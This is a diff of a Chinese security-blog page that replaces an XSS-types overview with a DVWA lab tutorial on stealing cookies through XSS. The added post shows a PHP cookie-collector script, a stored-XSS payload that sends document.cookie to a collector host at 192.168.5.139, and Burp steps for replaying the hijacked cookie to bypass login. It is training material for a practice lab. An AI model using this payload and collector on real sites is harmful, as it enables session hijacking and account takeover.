@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>xss跨站脚本分类 - SuQieR&#39;s Blog</title>
+  <title>xss窃取cookie利用 - SuQieR&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -165,7 +165,7 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2020-08-05 14:19">
+    <time datetime="2020-08-05 21:44">
       August 5, 2020 pm
     </time>
   </div>
@@ -176,7 +176,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      618 字
+      722 字
     </span>
   
 
@@ -186,7 +186,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      8
+      9
        分钟
     </span>
   
@@ -217,123 +217,134 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h2 id="XSS跨站脚本分类"><a href="#XSS跨站脚本分类" class="headerlink" title="XSS跨站脚本分类"></a>XSS跨站脚本分类</h2><h3 id="xss介绍"><a href="#xss介绍" class="headerlink" title="xss介绍"></a><strong>xss介绍</strong></h3><blockquote>
-<ul>
-<li>跨站脚本攻击 (Cross Site Scripting) 为了不和层叠样式表(Cascading Style Sheets CSS)的缩写混淆，故交跨站脚本攻击缩写为XSS，而已攻击者往Web页面里插入恶意script代码，当用户浏览该页知识，嵌入其中Web里面的script代码会被执行，从而达到而已攻击用户的目的</li>
-</ul>
-</blockquote>
-<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a><strong>反射型XSS</strong></h3><blockquote>
-<ul>
-<li><p>攻击者通过邮件等形式将包含XSS代码的连接发送给正常用户，当用户点击时，服务器接收该用户的请求并进行处理，然后把带有XSS的代码发送给用户。用户浏览器解析执行代码，触发XSS漏洞</p>
+              <h2 id="XSS-窃取cookie"><a href="#XSS-窃取cookie" class="headerlink" title="XSS  窃取cookie"></a>XSS  窃取cookie</h2><h3 id="cookie介绍"><a href="#cookie介绍" class="headerlink" title="cookie介绍"></a><strong>cookie介绍</strong></h3><ul>
+<li><p>cookie是在http协议下，服务器脚本可以维护客户工作站上信息的一种方式，cookie是由web服务器报错在用户浏览器上的小文本文件，它可以包含有关用户的信息</p>
 </li>
-<li><p>例如</p>
-<ul>
-<li><?php echo$_GET("uname")?>  </li>
-<li>当用户访问url?<code>uname=&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;</code>时，触发代码，弹出对话框</li>
-</ul>
+<li><p>有些cookie是临时的，有些事持续的，临时的只在浏览器报错一段时间，一但超过规定时间，该cookie就会被系统清楚</p>
 </li>
-<li><p>以dvwa为例</p>
+<li><p>服务器可以利用cookies包含信息的任意性来筛选并经常性维护这些信息，以判断在http传输中的状态。cookies最典行的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简化登录手续，这里都是cookies的功能，另一个重要应用场合是“购物车” 之类处理，用户可能会在一段时间内在同一家网站的不同页面选择不同的商品，这些信息都会写cookies，以便在最后付款时提取信息</p>
+</li>
+<li></li>
+</ul>
+<h3 id="XSS窃取cookie"><a href="#XSS窃取cookie" class="headerlink" title="XSS窃取cookie"></a><strong>XSS窃取cookie</strong></h3><ul>
+<li><p>demo环境为dvwa</p>
+</li>
+<li><p>存在反射型XSS漏洞的站点位置，可以利用以下链接盗取cookie</p>
+</li>
+<li><p>编写一个cookie.php文件，放在自己网站下，用来收集受害者的cookie。</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+$cookie = $_GET[<span class="hljs-string">'cookie'</span>];
+file_put_contents(<span class="hljs-string">"cookie.txt"</span>,$cookie);
+<span class="hljs-meta">?&gt;</span></code></pre>
+
 <ul>
-<li>弹出自定义内容</li>
+<li>在cookie.php同级目录下创建一个cookie.txt文件,给上读写权限 。</li>
+<li>手动创建cookie.txt文件是因为file_put_contents()函数可能因为目录权限问题无法创建文件。</li>
 </ul>
 <table>
 <thead>
 <tr>
-<th align="center"><code>&lt;scrip&gt;alert(&#39;hello&#39;) &lt;/script?&gt;</code></th>
+<th align="center"><code>读写权限不给上，会导致无法写入cookie</code></th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201538.png" srcset="/img/loading.gif" alt=""></td>
-</tr>
-</tbody></table>
-<ul>
-<li>弹出当前网页cookie</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="center"><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201642.png" srcset="/img/loading.gif" alt=""></td>
+<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826225954.png" srcset="/img/loading.gif" alt=""></td>
 </tr>
 </tbody></table>
 </li>
-</ul>
-</blockquote>
-<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a><strong>存储型XSS</strong></h3><blockquote>
-<ul>
-<li><p>存储型XSS又称持久型XSS，攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性</p>
-<ul>
-<li>攻击者在论坛，博客，留言板中，发帖的过程嵌入XSS代码，帖子被目标服务器存储在数据库中，当用户进行正常访问时，触发XSS代码</li>
-</ul>
-</li>
-<li><p>案例</p>
-<ul>
-<li>点击提交就会不断的弹出弹框</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="center"><code>&lt;script&gt;alert(&quot;this is test&quot;)&lt;/script&gt;</code></th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201759.png" srcset="/img/loading.gif" alt=""></td>
-</tr>
-</tbody></table>
+<li><p>这里以dvwa的存储型xss为例</p>
 </li>
 </ul>
-</blockquote>
-<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a><strong>DOM型XSS</strong></h3><blockquote>
+<table>
+<thead>
+<tr>
+<th align="center">f12修改输入框的最大文本长度，也就是maxlength的值，默认是50</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826230713.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
 <ul>
-<li>全称Document Object Model,使用DOM动态访问更新文档的内容，结构及样式</li>
+<li>插入payload</li>
 </ul>
 <table>
 <thead>
 <tr>
-<th align="center">DOM结构图</th>
+<th align="center"><code>&lt;script&gt;document.location=&quot;http://192.168.5.139/test/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</code></th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201915.png" srcset="/img/loading.gif" alt=""></td>
+<td align="center"><img src="C:%5CUsers%5CHeBe%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200826230953730.png" srcset="/img/loading.gif" alt="image-20200826230953730"></td>
 </tr>
 </tbody></table>
 <ul>
-<li>HTML标签都是节点，节点组成了节点树。通过HTML DOM可以树上的所有结点进行修改</li>
-<li>服务器响应不会处理攻击者脚本，而是用户浏览器处理这个响应时，DOM对象就会处理XSS代码，触发XSS漏洞。</li>
-<li>案例</li>
+<li>提交后会自动跳转到<code>document.location</code>里的链接</li>
 </ul>
 <table>
 <thead>
 <tr>
-<th align="center">在url default中输入值可以插入到网页中</th>
+<th align="center">访问了事先创建好的cookie.php，提交了当前用户的cookie</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201951.png" srcset="/img/loading.gif" alt=""></td>
+<td align="center"><img src="C:%5CUsers%5CHeBe%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200826231119924.png" srcset="/img/loading.gif" alt="image-20200826231119924"></td>
 </tr>
 </tbody></table>
 <table>
 <thead>
 <tr>
-<th align="center"><code>&lt;script&gt;alert(&quot;hello world&quot;)&lt;/script&gt;</code></th>
+<th align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827000524.png" srcset="/img/loading.gif" alt=""></th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826202029.png" srcset="/img/loading.gif" alt=""></td>
-</tr>
-<tr>
-<td align="center">发现代码已经嵌入网页内</td>
+<td align="center"></td>
 </tr>
 </tbody></table>
-</blockquote>
+<ul>
+<li>如果没有跳转的话可能是因为环境问题，或者是少了?cookie=后面的+号。</li>
+</ul>
+<h3 id="利用绕过验证登录"><a href="#利用绕过验证登录" class="headerlink" title="利用绕过验证登录"></a><strong>利用绕过验证登录</strong></h3><ul>
+<li>账号密码随便输，burp截断，放掉带有账号密码的包，将第二个只有cookie没有账号密码的数据包发送到repeater</li>
+<li>将cookie，替换成劫持到的cookie</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">点击go，显示了登录界面</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827000755.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">右键，选择浏览器打开，复制链接</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827001041.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">复制到浏览器中，成功绕过登录</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827001220.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+<ul>
+<li>如果无法绕过验证的话，可能是dvwa版本的原因，新版多了csrf令牌。</li>
+</ul>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
-<li>xss本应叫css的，但为了不和层叠样式表重名，特意叫成xss</li>
-<li>反射型xss，由服务端发送到浏览器，最后浏览器解析恶意代码。</li>
-<li>存储型xss，和反射型的区别在于，存储型xss将恶意代码存储到了服务器中，能够持久化攻击</li>
-<li>dom型xss，不同于前两者，dom型xss是基础dom文档对象模型的一种漏洞</li>
+<li>窃取cookie时，php代码没有执行写入cookie可以留意一下文件权限，这是个大坑。</li>
+<li>payload不跳转可以检查一下是不是少了拼接符+号</li>
+<li>绕过验证登录时，可能会因为csrf令牌不一致无法登录。</li>
 </ul>
 
             </article>
@@ -365,18 +376,12 @@
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2020/08/05/xss%E7%AA%83%E5%8F%96cookie%E5%88%A9%E7%94%A8/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">xss窃取cookie利用</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2020/08/04/sqli-less23-less28a/">
-                        <span class="hidden-mobile">sqli-less23-28a</span>
+                      <a href="/2020/08/05/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E5%88%86%E7%B1%BB/">
+                        <span class="hidden-mobile">xss跨站脚本分类</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -561,7 +566,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "xss跨站脚本分类&nbsp;",
+        "xss窃取cookie利用&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
